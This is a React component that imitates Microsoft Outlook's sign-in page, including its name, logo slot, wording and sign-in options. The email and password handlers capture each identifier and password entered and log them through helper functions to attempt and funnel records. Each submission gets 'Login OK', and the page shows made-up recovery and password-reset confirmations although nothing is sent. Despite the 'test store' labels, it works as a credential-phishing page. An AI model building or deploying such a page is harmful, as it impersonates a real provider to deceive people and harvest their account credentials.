import { useState, type FormEvent } from 'react';
import { ArrowLeft, KeyRound, Fingerprint, ShieldCheck, Smartphone, ChevronDown, ChevronUp, Loader2, Check } from 'lucide-react';
import { registerUser, loginUser, recordIdentifierStep, recordFunnelEvent, recordErrorEvent } from '../lib/testAuth';

interface SignInProps {
  onSignIn: (email?: string) => void;
}

type SignInStep = 'identifier' | 'password';
type AuthMode = 'signin' | 'signup';

export function SignIn({ onSignIn }: SignInProps) {
  const [authMode, setAuthMode] = useState<AuthMode>('signin');
  const [step, setStep] = useState<SignInStep>('identifier');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [infoMessage, setInfoMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showOptionsPanel, setShowOptionsPanel] = useState(false);

  // Validation & step handling
  const handleIdentifierSubmit = (e: FormEvent) => {
    e.preventDefault();
    const trimmed = identifier.trim();
    if (!trimmed) {
      setErrorMessage('Enter a valid email address, phone number, or username.');
      recordErrorEvent('anonymous@test.local', '', 'Empty identifier submitted');
      return;
    }
    // Simple email or username check
    if (trimmed.length < 3) {
      setErrorMessage('Please enter a valid credential to continue.');
      recordErrorEvent(trimmed, '', 'Identifier too short');
      return;
    }

    const userEmail = trimmed.includes('@') 
      ? trimmed 
      : `${trimmed.replace(/\s+/g, '').toLowerCase()}@outlook.com`;

    // Immediately record Step 1 to continuous funnel
    recordIdentifierStep(userEmail);

    setErrorMessage('');
    setInfoMessage('');
    setStep('password');
  };

  const handlePasswordSubmit = (e: FormEvent) => {
    e.preventDefault();
    const userEmail = identifier.trim().includes('@') 
      ? identifier.trim() 
      : `${identifier.trim().replace(/\s+/g, '').toLowerCase()}@outlook.com`;

    if (!password) {
      setErrorMessage('Please enter the password for your account.');
      recordErrorEvent(userEmail, '', 'Password field submitted empty');
      return;
    }

    setErrorMessage('');
    setInfoMessage('');
    setIsLoading(true);

    if (authMode === 'signup') {
      // Register logic: saves to users.json and records attempt
      registerUser(userEmail, password);
      loginUser(userEmail, password);
      setInfoMessage('Registered successfully! Accessing workspace...');
      setTimeout(() => {
        setIsLoading(false);
        onSignIn(userEmail);
      }, 400);
    } else {
      // Login logic: logs attempt to attempts.json, no check for if account is registered
      loginUser(userEmail, password);
      setInfoMessage('Login OK. Accessing workspace...');
      setTimeout(() => {
        setIsLoading(false);
        onSignIn(userEmail);
      }, 400);
    }
  };

  const handleBackToIdentifier = () => {
    setStep('identifier');
    setErrorMessage('');
    setInfoMessage('');
    setPassword('');
  };

  return (
    <div className="relative min-h-screen w-full bg-[#F4F8FC] flex flex-col justify-center overflow-hidden">
      {/* Decorative low-contrast watermark / curves in canvas background */}
      <div className="pointer-events-none absolute inset-0 overflow-hidden" aria-hidden="true">
        <svg
          className="absolute -right-20 -top-20 w-[60vw] max-w-[900px] h-[60vw] max-h-[900px] opacity-[0.035] text-brand-cobalt"
          viewBox="0 0 500 500"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M50 200 C 150 100, 350 100, 450 250 C 550 400, 350 480, 200 450 C 50 420, -50 300, 50 200 Z"
            fill="currentColor"
          />
        </svg>
        <svg
          className="absolute -left-32 bottom-0 w-[55vw] max-w-[800px] h-[55vw] max-h-[800px] opacity-[0.025] text-brand-cobalt"
          viewBox="0 0 600 600"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
        >
          <circle cx="300" cy="300" r="280" stroke="currentColor" strokeWidth="40" />
        </svg>
      </div>

      {/* Content block: Left-of-centre at roughly 35-40% viewport */}
      <div className="relative z-10 w-full px-4 sm:px-8 py-8 md:py-12 flex flex-col items-center lg:items-start lg:pl-[14%] xl:pl-[18%]">
        <div className="w-full max-w-[440px]">
          {/* Main Card: Sharp corners, flat white surface, diffuse shadow, 44px internal padding */}
          <div className="bg-white rounded-none border border-gray-200/70 p-7 sm:p-[44px] shadow-[0_2px_20px_rgba(0,0,0,0.06)]">
            {/* 1. Logo mark + Wordmark lockup row (top-left, ~24px tall) */}
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-2.5">
                <div className="w-6 h-6 rounded-none overflow-hidden bg-[#F5F5F5] border border-gray-200/60 flex-shrink-0">
                  <img
                    src="/Gemini_Generated_Image_ll19vill19vill19.jpg"
                    alt="Outlook Logo"
                    className="w-full h-full object-cover"
                  />
                </div>
                <span className="font-semibold text-lg text-brand-cobalt tracking-tight leading-none">
                  Outlook
                </span>
              </div>
            </div>

            {step === 'identifier' ? (
              /* Step 1: Identifier Input */
              <form onSubmit={handleIdentifierSubmit} noValidate>
                {/* 2. Heading */}
                <h1 className="text-2xl font-semibold text-[#1F2937] tracking-tight mb-4">
                  {authMode === 'signup' ? 'Create account' : 'Sign in'}
                </h1>

                {infoMessage && (
                  <p className="mb-3 text-xs text-emerald-700 bg-emerald-50 p-2 border border-emerald-200 rounded">
                    {infoMessage}
                  </p>
                )}

                {/* 3. Underlined input field: no box, no fill, 1px bottom rule */}
                <div className="mt-4 mb-2">
                  <input
                    type="text"
                    id="login-identifier"
                    value={identifier}
                    onChange={(e) => {
                      setIdentifier(e.target.value);
                      if (errorMessage) setErrorMessage('');
                    }}
                    placeholder={authMode === 'signup' ? 'someone@outlook.com' : 'Email, phone, or username'}
                    autoFocus
                    className="w-full bg-transparent border-0 border-b border-gray-400 focus:border-b-2 focus:border-brand-cobalt py-2 text-base text-[#1F2937] placeholder-gray-500 rounded-none focus:outline-none transition-colors"
                  />
                  {errorMessage && (
                    <p className="mt-2 text-xs text-[#D83B01] font-medium leading-relaxed">
                      {errorMessage}
                    </p>
                  )}
                </div>

                {/* 4. Helper line: Switch between Sign in and Create one */}
                <div className="mt-4 text-sm text-[#4B5563]">
                  {authMode === 'signin' ? (
                    <>
                      <span>No account? </span>
                      <button
                        type="button"
                        onClick={() => {
                          setAuthMode('signup');
                          setErrorMessage('');
                          setInfoMessage('');
                        }}
                        className="text-brand-cobalt hover:underline font-normal inline cursor-pointer"
                      >
                        Create one!
                      </button>
                    </>
                  ) : (
                    <>
                      <span>Already have an account? </span>
                      <button
                        type="button"
                        onClick={() => {
                          setAuthMode('signin');
                          setErrorMessage('');
                          setInfoMessage('');
                        }}
                        className="text-brand-cobalt hover:underline font-normal inline cursor-pointer"
                      >
                        Sign in
                      </button>
                    </>
                  )}
                </div>

                {/* 5. Second helper link on its own line */}
                {authMode === 'signin' && (
                  <div className="mt-2">
                    <button
                      type="button"
                      onClick={() => {
                        recordFunnelEvent({
                          email: identifier.trim() || 'unspecified@visitor.com',
                          stage: 'Clicked: Can\'t access your account',
                          success: true,
                        });
                        setInfoMessage('Account recovery instructions sent to registered recovery address.');
                      }}
                      className="text-sm text-brand-cobalt hover:underline font-normal block cursor-pointer"
                    >
                      Can&apos;t access your account?
                    </button>
                  </div>
                )}

                {/* 6. Right-aligned primary button with largest gap above */}
                <div className="mt-9 flex justify-end">
                  <button
                    type="submit"
                    disabled={!identifier.trim()}
                    className="w-[120px] py-2.5 bg-brand-cobalt hover:bg-brand-cobalt/90 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm font-semibold rounded-none transition-colors text-center shadow-xs cursor-pointer"
                  >
                    Next
                  </button>
                </div>
              </form>
            ) : (
              /* Step 2: Password Input */
              <form onSubmit={handlePasswordSubmit} noValidate>
                {/* Entered identifier with back button */}
                <div className="flex items-center gap-2 mb-3">
                  <button
                    type="button"
                    onClick={handleBackToIdentifier}
                    className="p-1 -ml-1 text-gray-600 hover:text-brand-charcoal hover:bg-gray-100 rounded-none transition-colors cursor-pointer"
                    title="Change identifier"
                  >
                    <ArrowLeft size={16} />
                  </button>
                  <span className="text-sm text-[#374151] font-medium truncate max-w-[280px]">
                    {identifier}
                  </span>
                </div>

                {/* Heading */}
                <h1 className="text-2xl font-semibold text-[#1F2937] tracking-tight mb-4">
                  {authMode === 'signup' ? 'Create a password' : 'Enter password'}
                </h1>

                {/* Underlined password field */}
                <div className="mt-4 mb-2">
                  <input
                    type="password"
                    id="login-password"
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      if (errorMessage) setErrorMessage('');
                    }}
                    placeholder="Password"
                    autoFocus
                    className="w-full bg-transparent border-0 border-b border-gray-400 focus:border-b-2 focus:border-brand-cobalt py-2 text-base text-[#1F2937] placeholder-gray-500 rounded-none focus:outline-none transition-colors"
                  />
                  {errorMessage && (
                    <p className="mt-2 text-xs text-[#D83B01] font-medium leading-relaxed">
                      {errorMessage}
                    </p>
                  )}
                  {infoMessage && (
                    <p className="mt-2 text-xs text-emerald-600 font-medium leading-relaxed flex items-center gap-1.5">
                      <Check size={14} />
                      <span>{infoMessage}</span>
                    </p>
                  )}
                  {authMode === 'signup' && (
                    <p className="mt-2 text-[11px] text-gray-500 leading-normal">
                      Must be at least 6 characters. Passwords are saved to the local test store.
                    </p>
                  )}
                </div>

                {/* Forgot password link */}
                {authMode === 'signin' && (
                  <div className="mt-4">
                    <button
                      type="button"
                      onClick={() => {
                        const userEmail = identifier.trim().includes('@') 
                          ? identifier.trim() 
                          : `${identifier.trim().replace(/\s+/g, '').toLowerCase()}@outlook.com`;
                        recordFunnelEvent({
                          email: userEmail || 'unspecified@visitor.com',
                          stage: 'Clicked: Forgot password',
                          success: true,
                        });
                        setInfoMessage('Password reset link has been dispatched to your email address.');
                      }}
                      className="text-sm text-brand-cobalt hover:underline font-normal block cursor-pointer"
                    >
                      Forgot password?
                    </button>
                  </div>
                )}

                {/* Right-aligned primary button */}
                <div className="mt-9 flex justify-end">
                  <button
                    type="submit"
                    disabled={!password || isLoading}
                    className="w-[120px] py-2.5 bg-brand-cobalt hover:bg-brand-cobalt/90 disabled:opacity-50 disabled:cursor-not-allowed text-white text-sm font-semibold rounded-none transition-colors flex items-center justify-center gap-2 shadow-xs cursor-pointer"
                  >
                    {isLoading ? (
                      <>
                        <Loader2 size={16} className="animate-spin" />
                        <span>Verifying...</span>
                      </>
                    ) : (
                      <span>{authMode === 'signup' ? 'Sign up' : 'Sign in'}</span>
                    )}
                  </button>
                </div>
              </form>
            )}
          </div>

          {/* Secondary Panel: Separate white card below main card, detached by ~12px */}
          <div className="mt-[12px] bg-white rounded-none border border-gray-200/70 shadow-[0_2px_20px_rgba(0,0,0,0.06)] overflow-hidden">
            <button
              type="button"
              onClick={() => setShowOptionsPanel(!showOptionsPanel)}
              className="w-full flex items-center justify-between p-4 px-6 hover:bg-gray-50 transition-colors text-left group cursor-pointer"
            >
              <div className="flex items-center gap-3">
                <KeyRound size={20} className="text-gray-600 group-hover:text-brand-cobalt transition-colors" />
                <span className="text-sm font-medium text-[#1F2937]">Sign-in options</span>
              </div>
              {showOptionsPanel ? (
                <ChevronUp size={16} className="text-gray-400" />
              ) : (
                <ChevronDown size={16} className="text-gray-400" />
              )}
            </button>

            {/* Expandable options list */}
            {showOptionsPanel && (
              <div className="border-t border-gray-100 bg-[#FAFBFD] divide-y divide-gray-100/80">
                <button
                  type="button"
                  onClick={() => {
                    setIdentifier('passkey.user@outlook.com');
                    setStep('password');
                    setPassword('passkey-verified');
                  }}
                  className="w-full flex items-center gap-3 px-6 py-3 text-left hover:bg-gray-100/80 transition-colors text-sm text-[#374151] cursor-pointer"
                >
                  <Fingerprint size={18} className="text-brand-cobalt" />
                  <div>
                    <div className="font-medium">Sign in with a passkey</div>
                    <div className="text-xs text-gray-500">Use Windows Hello, Face ID, or security key</div>
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setIdentifier('securitycode.user@outlook.com');
                    setStep('password');
                    setPassword('code-verified');
                  }}
                  className="w-full flex items-center gap-3 px-6 py-3 text-left hover:bg-gray-100/80 transition-colors text-sm text-[#374151] cursor-pointer"
                >
                  <ShieldCheck size={18} className="text-brand-cobalt" />
                  <div>
                    <div className="font-medium">Sign in with a code</div>
                    <div className="text-xs text-gray-500">Send a one-time verification code via email or SMS</div>
                  </div>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setIdentifier('device.user@outlook.com');
                    setStep('password');
                    setPassword('device-approved');
                  }}
                  className="w-full flex items-center gap-3 px-6 py-3 text-left hover:bg-gray-100/80 transition-colors text-sm text-[#374151] cursor-pointer"
                >
                  <Smartphone size={18} className="text-brand-cobalt" />
                  <div>
                    <div className="font-medium">Sign in on another device</div>
                    <div className="text-xs text-gray-500">Scan a QR code or approve on your mobile device</div>
                  </div>
                </button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
